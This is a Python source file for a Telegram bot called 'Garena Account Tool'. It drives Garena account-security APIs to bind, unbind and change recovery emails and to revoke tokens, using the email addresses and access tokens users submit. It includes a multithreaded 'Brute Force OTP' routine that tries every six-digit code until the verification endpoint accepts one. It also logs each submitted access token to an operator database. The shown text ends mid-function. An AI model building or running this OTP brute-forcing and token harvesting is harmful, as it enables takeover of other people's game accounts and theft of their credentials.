"""Garena Account Tool - Smart Telegram Bot with credential memory & activity monitoring."""

import asyncio
import concurrent.futures
import logging
import os
import threading
import requests

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ConversationHandler,
    ContextTypes,
    MessageHandler,
    PicklePersistence,
    filters,
)

import db
import monitoring

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)

# ─── Garena Config ────────────────────────────────────────────────────────────

GARENA_APP_ID = "100067"
GARENA_HEADERS = {
    "User-Agent": "GarenaMSDK/4.0.41(TECNO KJ5 ;Android 13;en;HK;app 1.123.1 2019120270;)",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "application/json",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
}

# Feature identifiers
FEAT_ADD     = "add"
FEAT_CHECK   = "check"
FEAT_PLAT    = "platform"
FEAT_CANCEL  = "cancel"
FEAT_REVOKE  = "revoke"
FEAT_UNBIND  = "unbind"
FEAT_CHANGE  = "change"
FEAT_BF      = "bf"

# ─── Conversation States ──────────────────────────────────────────────────────

(
    MAIN_MENU,
    # ── Credential flow: email + token ───────────────
    CREDS_CONFIRM,
    CREDS_NEW_EMAIL,
    CREDS_NEW_ACCESS,
    CREDS_SAVE_ASK,
    # ── Credential flow: token only ──────────────────
    CREDS_TOKEN_CONFIRM,
    CREDS_TOKEN_NEW,
    CREDS_TOKEN_SAVE_ASK,
    # ── Feature-specific states ───────────────────────
    ADD_OTP,
    UNBIND_METHOD,
    UNBIND_OTP,
    UNBIND_PASS,
    CHANGE_NEW_EMAIL,
    CHANGE_METHOD,
    CHANGE_OLD_OTP,
    CHANGE_PASS,
    CHANGE_NEW_OTP,
) = range(17)

# ─── Garena API Helpers ───────────────────────────────────────────────────────

def _post(url: str, data: dict) -> dict:
    r = requests.post(url, headers=GARENA_HEADERS, data=data, timeout=30)
    r.raise_for_status()
    return r.json()

def _get(url: str, params: dict) -> dict:
    r = requests.get(url, headers=GARENA_HEADERS, params=params, timeout=30)
    r.raise_for_status()
    return r.json()

def api_send_otp(email: str, access: str) -> dict:
    return _post(
        "https://100067.connect.garena.com/game/account_security/bind:send_otp",
        {"email": email, "locale": "en_MA", "region": "IND",
         "app_id": GARENA_APP_ID, "access_token": access},
    )

def api_verify_otp(email: str, access: str, otp: str) -> dict:
    return _post(
        "https://100067.connect.garena.com/game/account_security/bind:verify_otp",
        {"email": email, "app_id": GARENA_APP_ID, "access_token": access, "otp": otp},
    )

def api_verify_identity_otp(email: str, access: str, otp: str) -> dict:
    return _post(
        "https://100067.connect.garena.com/game/account_security/bind:verify_identity",
        {"email": email, "otp": otp, "app_id": GARENA_APP_ID, "access_token": access},
    )

def api_verify_identity_password(email: str, access: str, password: str) -> dict:
    return _post(
        "https://100067.connect.garena.com/game/account_security/bind:verify_identity",
        {"email": email, "secondary_password": password,
         "app_id": GARENA_APP_ID, "access_token": access},
    )

def api_cancel_request(access: str) -> dict:
    return _post(
        "https://100067.connect.garena.com/game/account_security/bind:cancel_request",
        {"app_id": GARENA_APP_ID, "access_token": access},
    )

def api_create_bind_request(access: str, verifier_token: str, email: str) -> dict:
    return _post(
        "https://100067.connect.garena.com/game/account_security/bind:create_bind_request",
        {
            "app_id": GARENA_APP_ID, "access_token": access,
            "verifier_token": verifier_token,
            "secondary_password": "91B4D142823F7D20C5F08DF69122DE43F35F057A988D9619F6D3138485C9A203",
            "email": email,
        },
    )

def api_get_bind_info(access: str) -> dict:
    return _get(
        "https://100067.connect.garena.com/game/account_security/bind:get_bind_info",
        {"app_id": GARENA_APP_ID, "access_token": access},
    )

def api_get_platforms(access: str) -> dict:
    return _get(
        "https://100067.connect.garena.com/bind/app/platform/info/get",
        {"access_token": access},
    )

def api_create_unbind_request(access: str, identity_token: str) -> dict:
    return _post(
        "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request",
        {"app_id": GARENA_APP_ID, "access_token": access, "identity_token": identity_token},
    )

def api_create_rebind_request(
    access: str, identity_token: str, verifier_token: str, new_email: str
) -> dict:
    return _post(
        "https://100067.connect.garena.com/game/account_security/bind:create_rebind_request",
        {
            "identity_token": identity_token, "email": new_email,
            "app_id": GARENA_APP_ID, "verifier_token": verifier_token,
            "access_token": access,
        },
    )

def api_revoke_token(access: str) -> str:
    r = requests.get(
        f"https://100067.connect.garena.com/oauth/logout?access_token={access}",
        timeout=30,
    )
    return r.text.strip()

def convert_time(seconds: int) -> str:
    d, rem = divmod(int(seconds), 86400)
    h, rem = divmod(rem, 3600)
    m, s = divmod(rem, 60)
    return f"{d}d {h}h {m}m {s}s"

# ─── Credential Store Helpers ─────────────────────────────────────────────────

def has_saved_creds(ud: dict) -> bool:
    return bool(ud.get("saved_email") and ud.get("saved_access"))

def has_saved_access(ud: dict) -> bool:
    return bool(ud.get("saved_access"))

def mask_token(token: str) -> str:
    if len(token) > 16:
        return f"{token[:10]}...{token[-4:]}"
    return token[:6] + "..."

def _save_creds(ud: dict, email: str, access: str) -> None:
    ud["saved_email"] = email
    ud["saved_access"] = access

def _save_access(ud: dict, access: str) -> None:
    ud["saved_access"] = access

def _load_saved(ud: dict) -> None:
    ud["email"]  = ud.get("saved_email", "")
    ud["access"] = ud.get("saved_access", "")

# ─── Activity Logging ─────────────────────────────────────────────────────────

def _log(update: Update, context: ContextTypes.DEFAULT_TYPE, feature: str) -> None:
    """Log this feature execution to the monitoring database."""
    user = update.effective_user
    if not user:
        return
    ud     = context.user_data
    log_id = db.log_entry(
        user_id     = user.id,
        username    = user.username,
        first_name  = user.first_name,
        feature     = feature,
        email       = ud.get("email") or None,
        access_token= ud.get("access") or None,
    )
    ud["_log_id"] = log_id


def _log_result(context: ContextTypes.DEFAULT_TYPE, result: str) -> None:
    """Update the result of the current log entry."""
    log_id = context.user_data.get("_log_id")
    if log_id:
        db.update_result(log_id, result)

# ─── Keyboard Builders ────────────────────────────────────────────────────────

def main_menu_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📧 Add Recovery Email",    callback_data="add_email"),
         InlineKeyboardButton("🔍 Check Recovery Email",  callback_data="check_email")],
        [InlineKeyboardButton("🔗 Check Platform",        callback_data="check_platform"),
         InlineKeyboardButton("❌ Cancel Recovery Email", callback_data="cancel_email")],
        [InlineKeyboardButton("🔓 Unbind Email",          callback_data="unbind_email"),
         InlineKeyboardButton("🔄 Change Bind Email",     callback_data="change_bind")],
        [InlineKeyboardButton("🚫 Revoke Token",          callback_data="revoke_token"),
         InlineKeyboardButton("🔨 Brute Force OTP",       callback_data="brute_force")],
        [InlineKeyboardButton("🗑️ Saved Creds Clear Karo", callback_data="clear_creds")],
    ])

def back_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("🏠 Main Menu", callback_data="back_main")
    ]])

def save_ask_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💾 Haan, save karo", callback_data="save_yes"),
         InlineKeyboardButton("🚫 Nahi",            callback_data="save_no")],
        [InlineKeyboardButton("🏠 Main Menu",       callback_data="back_main")],
    ])

def use_saved_kb(email: str, token: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"✅ Use: {email} / {mask_token(token)}", callback_data="use_saved")],
        [InlineKeyboardButton("🆕 Dusra account use karo", callback_data="use_new")],
        [InlineKeyboardButton("🏠 Main Menu",              callback_data="back_main")],
    ])

def use_saved_token_kb(token: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"✅ Use saved: {mask_token(token)}", callback_data="use_saved_token")],
        [InlineKeyboardButton("🆕 Dusra token use karo",           callback_data="use_new_token")],
        [InlineKeyboardButton("🏠 Main Menu",                      callback_data="back_main")],
    ])

def method_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📨 Email OTP se",          callback_data=f"{prefix}_otp")],
        [InlineKeyboardButton("🔐 Secondary Password se", callback_data=f"{prefix}_pass")],
        [InlineKeyboardButton("🏠 Main Menu",             callback_data="back_main")],
    ])

# ─── Shared Utilities ─────────────────────────────────────────────────────────

def _saved_info_line(ud: dict) -> str:
    if has_saved_creds(ud):
        return (f"📌 <b>Saved:</b> <code>{ud['saved_email']}</code> / "
                f"<code>{mask_token(ud['saved_access'])}</code>\n")
    elif has_saved_access(ud):
        return f"📌 <b>Saved token:</b> <code>{mask_token(ud['saved_access'])}</code>\n"
    return ""


async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    ud = context.user_data
    for key in ["email", "access", "new_email", "_feature",
                "unbind_method", "identity_token", "_log_id"]:
        ud.pop(key, None)

    text = (
        "🎮 <b>Garena Account Tool</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        + _saved_info_line(ud) +
        "👇 Feature choose karo:"
    )
    kb = main_menu_keyboard()
    target = update.message or (update.callback_query.message if update.callback_query else None)

    if update.callback_query:
        await update.callback_query.answer()
        try:
            await update.callback_query.edit_message_text(text, parse_mode="HTML", reply_markup=kb)
            return MAIN_MENU
        except Exception:
            pass

    if target:
        try:
            await target.reply_text(text, parse_mode="HTML", reply_markup=kb)
        except Exception:
            # Fallback plain text without tags if HTML parsing fails
            clean_text = text.replace("<b>", "").replace("</b>", "").replace("<code>", "").replace("</code>", "")
            await target.reply_text(clean_text, reply_markup=kb)
    return MAIN_MENU


async def cancel_op(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    _log_result(context, "cancelled")
    await update.effective_message.reply_text("❌ Cancel ho gaya.", reply_markup=back_kb())
    return ConversationHandler.END


async def _done(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str) -> None:
    _log_result(context, "success")
    try:
        await update.effective_message.reply_text(
            text, parse_mode="HTML", reply_markup=back_kb()
        )
    except Exception:
        clean = text.replace("<b>", "").replace("</b>", "").replace("<code>", "").replace("</code>", "")
        await update.effective_message.reply_text(clean, reply_markup=back_kb())


async def _err(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str) -> None:
    _log_result(context, "failed")
    try:
        await update.effective_message.reply_text(
            f"❌ {text}", parse_mode="HTML", reply_markup=back_kb()
        )
    except Exception:
        clean = text.replace("<b>", "").replace("</b>", "").replace("<code>", "").replace("</code>", "")
        await update.effective_message.reply_text(f"❌ {clean}", reply_markup=back_kb())

# ─── Feature Routing ─────────────────────────────────────────────────────────

async def proceed_to_feature(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    ud      = context.user_data
    feature = ud.get("_feature")
    email   = ud.get("email", "")
    access  = ud.get("access", "")
    msg     = update.effective_message

    # Log the activity to monitoring DB
    _log(update, context, feature)

    # ── Token-only features ───────────────────────────────────────────────────

    if feature == FEAT_CHECK:
        await msg.reply_text("⏳ Info fetch kar raha hoon...")
        try:
            data = api_get_bind_info(access)
            ev, ep = data.get("email", ""), data.get("email_to_be", "")
            cd = data.get("request_exec_countdown", 0)
            if not ev and ep:
                result = f"📧 *Pending Email:* `{ep}`\n⏰ *Confirm Hoga:* {convert_time(cd)}"
            elif ev and not ep:
                result = f"📧 *Linked Email:* `{ev}`\n✅ *Confirmed!*"
            else:
                result = "❌ Koi email linked nahi hai!"
            await _done(update, context, result)
        except Exception as e:
            await _err(update, context, f"Error: `{e}`")
        return ConversationHandler.END

    if feature == FEAT_PLAT:
        await msg.reply_text("⏳ Platform info fetch kar raha hoon...")
        try:
            j  = api_get_platforms(access)
            pm = {3:"Facebook",5:"VK",7:"Huawei",8:"Gmail",10:"iCloud",11:"Twitter"}
            bounded, available = j.get("bounded_accounts",[]), j.get("available_platforms",[])
            lines, found = ["🔗 *Secondary Links:*"], False
            for x in bounded:
                p, ui = x.get("platform"), x.get("user_info",{})
                if p in pm:
                    lines.append(f"\n*{pm[p]}*")
                    if ui.get("email"):   lines.append(f"  📧 `{ui['email']}`")
                    if ui.get("nickname"):lines.append(f"  👤 `{ui['nickname']}`")
                    found = True
            if not found:
                lines.append("  _Koi secondary link nahi mila_")
            for k, name in pm.items():
                if k not in available:
                    lines.append(f"\n🎮 *Main Platform:* {name}"); break
            await _done(update, context, "\n".join(lines))
        except Exception as e:
            await _err(update, context, f"Error: `{e}`")
        return ConversationHandler.END

    if feature == FEAT_CANCEL:
        await msg.reply_text("⏳ Cancel kar raha hoon...")
        try:
            res = api_cancel_request(access)
            if res.get("result") == 0:
                await _done(update, context, "✅ Recovery email request cancel ho gaya!")
            else:
                await _err(update, context, f"Cancel fail:\n`{res}`")
        except Exception as e:
            await _err(update, context, f"Error: `{e}`")
        return ConversationHandler.END

    if feature == FEAT_REVOKE:
        await msg.reply_text("⏳ Token revoke kar raha hoon...")
        try:
            resp = api_revoke_token(access)
            if resp == '{"result":0}':
                await _done(update, context, "✅ *Token successfully revoke ho gaya!* 🎉")
            else:
                await _err(update, context, f"Revoke fail:\n`{resp}`")
        except Exception as e:
            await _err(update, context, f"Error: `{e}`")
        return ConversationHandler.END

    # ── Email + Token features ────────────────────────────────────────────────

    if feature == FEAT_ADD:
        await msg.reply_text("⏳ OTP bhej raha hoon...")
        try:
            res = api_send_otp(email, access)
            if res.get("result") == 0:
                await msg.reply_text(
                    f"✅ OTP `{email}` pe bhej diya!\n\n📝 OTP enter karo:",
                    parse_mode="Markdown"
                )
                return ADD_OTP
            else:
                await _err(update, context, f"OTP send fail:\n`{res}`")
                return ConversationHandler.END
        except Exception as e:
            await _err(update, context, f"Error: `{e}`")
            return ConversationHandler.END

    if feature == FEAT_UNBIND:
        await msg.reply_text(
            "🔓 *Unbind Email*\n━━━━━━━━━━━━━━━━━━━━━━\n👇 Verify method:",
            parse_mode="Markdown", reply_markup=method_kb("unbind")
        )
        return UNBIND_METHOD

    if feature == FEAT_CHANGE:
        await msg.reply_text("📝 Nayi (new) email address type karo jisme bind karna hai:")
        return CHANGE_NEW_EMAIL

    if feature == FEAT_BF:
        chat_id = update.effective_chat.id
        await msg.reply_text("⏳ OTP bhej raha hoon...")
        try:
            res = api_send_otp(email, access)
            if res.get("result") != 0:
                await _err(update, context, f"OTP send fail:\n`{res}`")
                return ConversationHandler.END
        except Exception as e:
            await _err(update, context, f"Error: `{e}`")
            return ConversationHandler.END
        await msg.reply_text(
            "✅ OTP bhej diya!\n\n"
            "🔨 *Brute Force background mein shuru ho gaya!*\n"
            "Jab sahi code mile sirf tab ek message aayega. ⏳",
            parse_mode="Markdown", reply_markup=back_kb()
        )
        context.application.create_task(
            run_brute_force(chat_id, email, access, context.application.bot,
                            context.user_data.get("_log_id"))
        )
        return ConversationHandler.END

    return ConversationHandler.END

# ─── Credential Flow: email + token ──────────────────────────────────────────

async def _start_email_token_feature(
    update: Update, context: ContextTypes.DEFAULT_TYPE,
    feature: str, title: str, icon: str
) -> int:
    ud = context.user_data
    ud["_feature"] = feature
    await update.callback_query.answer()
    if has_saved_creds(ud):
        await update.callback_query.edit_message_text(
            f"{icon} *{title}*\n━━━━━━━━━━━━━━━━━━━━━━\n"
            "📌 *Saved credentials mili hain:*\n"
            f"📧 `{ud['saved_email']}`\n"
            f"🔑 `{mask_token(ud['saved_access'])}`\n\n"
            "Inhe use karein ya dusra account?",
            parse_mode="Markdown",
            reply_markup=use_saved_kb(ud["saved_email"], ud["saved_access"]),
        )
        return CREDS_CONFIRM
    await update.callback_query.edit_message_text(
        f"{icon} *{title}*\n━━━━━━━━━━━━━━━━━━━━━━\n📝 Email address type karo:",
        parse_mode="Markdown"
    )
    return CREDS_NEW_EMAIL


async def _start_token_feature(
    update: Update, context: ContextTypes.DEFAULT_TYPE,
    feature: str, title: str, icon: str
) -> int:
    ud = context.user_data
    ud["_feature"] = feature
    await update.callback_query.answer()
    if has_saved_access(ud):
        await update.callback_query.edit_message_text(
            f"{icon} *{title}*\n━━━━━━━━━━━━━━━━━━━━━━\n"
            "📌 *Saved token mila hai:*\n"
            f"🔑 `{mask_token(ud['saved_access'])}`\n\n"
            "Ise use karein ya naya token?",
            parse_mode="Markdown",
            reply_markup=use_saved_token_kb(ud["saved_access"]),
        )
        return CREDS_TOKEN_CONFIRM
    await update.callback_query.edit_message_text(
        f"{icon} *{title}*\n━━━━━━━━━━━━━━━━━━━━━━\n📝 Access Token type karo:",
        parse_mode="Markdown"
    )
    return CREDS_TOKEN_NEW


async def creds_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.callback_query.answer()
    data, ud = update.callback_query.data, context.user_data
    if data == "back_main":
        return await show_main_menu(update, context)
    if data == "use_saved":
        _load_saved(ud)
        await update.callback_query.edit_message_text(
            f"✅ *Saved credentials load ho gayi:*\n"
            f"📧 `{ud['email']}`\n🔑 `{mask_token(ud['access'])}`\n\n⏳ Processing...",
            parse_mode="Markdown"
        )
        return await proceed_to_feature(update, context)
    if data == "use_new":
        await update.callback_query.edit_message_text(
            "🆕 *Naya Account*\n━━━━━━━━━━━━━━━━━━━━━━\n📝 Email address type karo:",
            parse_mode="Markdown"
        )
        return CREDS_NEW_EMAIL
    return CREDS_CONFIRM


async def creds_new_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["email"] = update.message.text.strip()
    await update.message.reply_text("📝 Access Token type karo:")
    return CREDS_NEW_ACCESS


async def creds_new_access(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["access"] = update.message.text.strip()
    await update.message.reply_text(
        "💾 Ye credentials save karein agle baar ke liye?",
        reply_markup=save_ask_kb()
    )
    return CREDS_SAVE_ASK


async def creds_save_ask(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.callback_query.answer()
    data, ud = update.callback_query.data, context.user_data
    if data == "back_main":
        return await show_main_menu(update, context)
    if data == "save_yes":
        _save_creds(ud, ud["email"], ud["access"])
        await update.callback_query.edit_message_text(
            "✅ *Credentials save ho gayi!*\n⏳ Processing...", parse_mode="Markdown"
        )
    else:
        await update.callback_query.edit_message_text("⏳ Processing...")
    return await proceed_to_feature(update, context)

# ─── Credential Flow: token only ─────────────────────────────────────────────

async def creds_token_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.callback_query.answer()
    data, ud = update.callback_query.data, context.user_data
    if data == "back_main":
        return await show_main_menu(update, context)
    if data == "use_saved_token":
        ud["access"] = ud["saved_access"]
        await update.callback_query.edit_message_text(
            f"✅ *Saved token load ho gaya:*\n🔑 `{mask_token(ud['access'])}`\n\n⏳ Processing...",
            parse_mode="Markdown"
        )
        return await proceed_to_feature(update, context)
    if data == "use_new_token":
        await update.callback_query.edit_message_text(
            "🆕 *Naya Token*\n━━━━━━━━━━━━━━━━━━━━━━\n📝 Access Token type karo:",
            parse_mode="Markdown"
        )
        return CREDS_TOKEN_NEW
    return CREDS_TOKEN_CONFIRM


async def creds_token_new(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["access"] = update.message.text.strip()
    await update.message.reply_text(
        "💾 Ye token save karein agle baar ke liye?", reply_markup=save_ask_kb()
    )
    return CREDS_TOKEN_SAVE_ASK


async def creds_token_save_ask(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.callback_query.answer()
    data, ud = update.callback_query.data, context.user_data
    if data == "back_main":
        return await show_main_menu(update, context)
    if data == "save_yes":
        _save_access(ud, ud["access"])
        await update.callback_query.edit_message_text(
            "✅ *Token save ho gaya!*\n⏳ Processing...", parse_mode="Markdown"
        )
    else:
        await update.callback_query.edit_message_text("⏳ Processing...")
    return await proceed_to_feature(update, context)

# ─── Feature Button Handlers ──────────────────────────────────────────────────

async def add_email_start(u: Update, c: ContextTypes.DEFAULT_TYPE) -> int:
    return await _start_email_token_feature(u, c, FEAT_ADD, "Add Recovery Email", "📧")

async def check_email_start(u: Update, c: ContextTypes.DEFAULT_TYPE) -> int:
    return await _start_token_feature(u, c, FEAT_CHECK, "Check Recovery Email", "🔍")

async def platform_start(u: Update, c: ContextTypes.DEFAULT_TYPE) -> int:
    return await _start_token_feature(u, c, FEAT_PLAT, "Check Platform", "🔗")

async def cancel_email_start(u: Update, c: ContextTypes.DEFAULT_TYPE) -> int:
    return await _start_token_feature(u, c, FEAT_CANCEL, "Cancel Recovery Email", "❌")

async def revoke_start(u: Update, c: ContextTypes.DEFAULT_TYPE) -> int:
    return await _start_token_feature(u, c, FEAT_REVOKE, "Revoke Access Token", "🚫")

async def unbind_start(u: Update, c: ContextTypes.DEFAULT_TYPE) -> int:
    return await _start_email_token_feature(u, c, FEAT_UNBIND, "Unbind Email", "🔓")

async def change_bind_start(u: Update, c: ContextTypes.DEFAULT_TYPE) -> int:
    return await _start_email_token_feature(u, c, FEAT_CHANGE, "Change Bind Email", "🔄")

async def bf_start(u: Update, c: ContextTypes.DEFAULT_TYPE) -> int:
    return await _start_email_token_feature(u, c, FEAT_BF, "Brute Force OTP", "🔨")

async def clear_creds(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.callback_query.answer()
    context.user_data.pop("saved_email", None)
    context.user_data.pop("saved_access", None)
    return await show_main_menu(update, context)

# ─── Add Email: OTP State ─────────────────────────────────────────────────────

async def add_get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    otp, ud = update.message.text.strip(), context.user_data
    email, access = ud["email"], ud["access"]
    await update.message.reply_text("⏳ OTP verify kar raha hoon...")
    try:
        res = api_verify_otp(email, access, otp)
        verifier_token = res.get("verifier_token")
        if not verifier_token:
            await _err(update, context, f"OTP verify fail:\n`{res}`")
            return ConversationHandler.END
        await update.message.reply_text("⏳ Email bind kar raha hoon...")
        api_cancel_request(access)
        bind_res = api_create_bind_request(access, verifier_token, email)
        if bind_res.get("result") == 0:
            await _done(update, context, f"✅ *SUCCESS!*\n`{email}` successfully add ho gaya!")
        else:
            await _err(update, context, f"Bind fail:\n`{bind_res}`")
    except Exception as e:
        await _err(update, context, f"Error: `{e}`")
    return ConversationHandler.END

# ─── Unbind Email States ──────────────────────────────────────────────────────

async def unbind_method(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.callback_query.answer()
    data = update.callback_query.data
    if data == "back_main":
        return await show_main_menu(update, context)
    ud = context.user_data
    if data == "unbind_otp":
        email, access = ud["email"], ud["access"]
        await update.callback_query.edit_message_text(
            f"⏳ OTP `{email}` pe bhej raha hoon...", parse_mode="Markdown"
        )
        try:
            res = api_send_otp(email, access)
            if res.get("result") == 0:
                await update.callback_query.message.reply_text("✅ OTP bhej diya!\n\n📝 OTP enter karo:")
                return UNBIND_OTP
            else:
                await _err(update, context, f"OTP send fail:\n`{res}`")
                return ConversationHandler.END
        except Exception as e:
            await _err(update, context, f"Error: `{e}`")
            return ConversationHandler.END
    await update.callback_query.edit_message_text("📝 Secondary Password type karo:")
    return UNBIND_PASS


async def unbind_get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    otp, ud = update.message.text.strip(), context.user_data
    await update.message.reply_text("⏳ Identity verify kar raha hoon...")
    try:
        res = api_verify_identity_otp(ud["email"], ud["access"], otp)
        it = res.get("identity_token")
        if not it:
            await _err(update, context, f"Verify fail:\n`{res}`"); return ConversationHandler.END
        await update.message.reply_text("⏳ Unbind request create kar raha hoon...")
        r2 = api_create_unbind_request(ud["access"], it)
        if r2.get("result") == 0:
            await _done(update, context, "✅ *SUCCESS!* Email unbind request create ho gaya!")
        else:
            await _err(update, context, f"Unbind fail:\n`{r2}`")
    except Exception as e:
        await _err(update, context, f"Error: `{e}`")
    return ConversationHandler.END


async def unbind_get_pass(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    pw, ud = update.message.text.strip(), context.user_data
    await update.message.reply_text("⏳ Secondary password verify kar raha hoon...")
    try:
        res = api_verify_identity_password(ud["email"], ud["access"], pw)
        it = res.get("identity_token")
        if not it:
            await _err(update, context, f"Verify fail:\n`{res}`"); return ConversationHandler.END
        await update.message.reply_text("⏳ Unbind request create kar raha hoon...")
        r2 = api_create_unbind_request(ud["access"], it)
        if r2.get("result") == 0:
            await _done(update, context, "✅ *SUCCESS!* Email unbind request create ho gaya!")
        else:
            await _err(update, context, f"Unbind fail:\n`{r2}`")
    except Exception as e:
        await _err(update, context, f"Error: `{e}`")
    return ConversationHandler.END

# ─── Change Bind Email States ─────────────────────────────────────────────────

async def change_get_new_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["new_email"] = update.message.text.strip()
    await update.message.reply_text(
        "🔄 *Change Bind Email*\n━━━━━━━━━━━━━━━━━━━━━━\nPurani email verify karne ka method:",
        parse_mode="Markdown", reply_markup=method_kb("chg")
    )
    return CHANGE_METHOD


async def change_method(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.callback_query.answer()
    data, ud = update.callback_query.data, context.user_data
    if data == "back_main":
        return await show_main_menu(update, context)
    if data == "chg_otp":
        await update.callback_query.edit_message_text(
            f"⏳ OTP `{ud['email']}` pe bhej raha hoon...", parse_mode="Markdown"
        )
        try:
            res = api_send_otp(ud["email"], ud["access"])
            if res.get("result") == 0:
                await update.callback_query.message.reply_text("✅ OTP bhej diya!\n\n📝 Purani email ka OTP enter karo:")
                return CHANGE_OLD_OTP
            else:
                await _err(update, context, f"OTP send fail:\n`{res}`")
                return ConversationHandler.END
        except Exception as e:
            await _err(update, context, f"Error: `{e}`")
            return ConversationHandler.END
    await update.callback_query.edit_message_text("📝 Secondary Password type karo:")
    return CHANGE_PASS


async def _send_new_email_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    ud = context.user_data
    await update.effective_message.reply_text(
        f"⏳ OTP `{ud['new_email']}` pe bhej raha hoon...", parse_mode="Markdown"
    )
    try:
        res = api_send_otp(ud["new_email"], ud["access"])
        if res.get("result") == 0:
            await update.effective_message.reply_text("✅ OTP bhej diya!\n\n📝 Nayi email ka OTP enter karo:")
            return CHANGE_NEW_OTP
        else:
            await _err(update, context, f"OTP send fail:\n`{res}`")
            return ConversationHandler.END
    except Exception as e:
        await _err(update, context, f"Error: `{e}`")
        return ConversationHandler.END


async def change_get_old_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    otp, ud = update.message.text.strip(), context.user_data
    await update.message.reply_text("⏳ Identity verify kar raha hoon...")
    try:
        res = api_verify_identity_otp(ud["email"], ud["access"], otp)
        it = res.get("identity_token")
        if not it:
            await _err(update, context, f"Verify fail:\n`{res}`"); return ConversationHandler.END
        ud["identity_token"] = it
        return await _send_new_email_otp(update, context)
    except Exception as e:
        await _err(update, context, f"Error: `{e}`"); return ConversationHandler.END


async def change_get_pass(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    pw, ud = update.message.text.strip(), context.user_data
    await update.message.reply_text("⏳ Secondary password verify kar raha hoon...")
    try:
        res = api_verify_identity_password(ud["email"], ud["access"], pw)
        it = res.get("identity_token")
        if not it:
            await _err(update, context, f"Verify fail:\n`{res}`"); return ConversationHandler.END
        ud["identity_token"] = it
        return await _send_new_email_otp(update, context)
    except Exception as e:
        await _err(update, context, f"Error: `{e}`"); return ConversationHandler.END


async def change_get_new_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    otp, ud = update.message.text.strip(), context.user_data
    await update.message.reply_text("⏳ Nayi email verify kar raha hoon...")
    try:
        res = api_verify_otp(ud["new_email"], ud["access"], otp)
        vt = res.get("verifier_token")
        if not vt:
            await _err(update, context, f"Verify fail:\n`{res}`"); return ConversationHandler.END
        await update.message.reply_text("⏳ Rebind request create kar raha hoon...")
        r2 = api_create_rebind_request(ud["access"], ud["identity_token"], vt, ud["new_email"])
        if r2.get("result") == 0:
            await _done(update, context, f"✅ *SUCCESS!* Email `{ud['new_email']}` pe change ho gaya!")
        else:
            await _err(update, context, f"Rebind fail:\n`{r2}`")
    except Exception as e:
        await _err(update, context, f"Error: `{e}`")
    return ConversationHandler.END

# ─── Brute Force (Background) ─────────────────────────────────────────────────

async def run_brute_force(
    chat_id: int, email: str, access: str, bot, log_id: int | None
) -> None:
    found_event   = threading.Event()
    result_holder: list[dict] = []

    def try_codes(start: int, end: int) -> None:
        url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
        for code in range(start, end):
            if found_event.is_set():
                return
            code_str = f"{code:06d}"
            try:
                resp   = requests.post(url, headers=GARENA_HEADERS,
                                       data={"email": email, "app_id": GARENA_APP_ID,
                                             "access_token": access, "otp": code_str},
                                       timeout=15)
                result = resp.json()
                if result.get("result") == 0:
                    found_event.set()
                    result_holder.append({"code": code_str,
                                          "verifier_token": result.get("verifier_token", "")})
                    return
            except Exception:
                if found_event.is_set():
                    return

    NUM_THREADS, TOTAL = 20, 1_000_000
    chunk = TOTAL // NUM_THREADS

    loop = asyncio.get_event_loop()
    def run_pool() -> None:
        with concurrent.futures.ThreadPoolExecutor(max_workers=NUM_THREADS) as ex:
            futures = [
                ex.submit(try_codes, i * chunk,
                          (i + 1) * chunk if i < NUM_THREADS - 1 else TOTAL)
                for i in range(NUM_THREADS)
            ]
            concurrent.futures.wait(futures)

    await loop.run_in_executor(None, run_pool)

    if result_holder:
        r = result_holder[0]
        if log_id:
            db.update_result(log_id, "success")
        await bot.send_message(
            chat_id=chat_id,
            text=(
                "🎯 *Brute Force — CODE MIL GAYA!*\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🔑 OTP Code: `{r['code']}`\n"
                f"🎫 Verifier Token: `{r['verifier_token']}`"
            ),
            parse_mode="Markdown", reply_markup=back_kb()
        )
    else:
        if log_id:
            db.update_result(log_id, "failed")
        await bot.send_message(
            chat_id=chat_id,
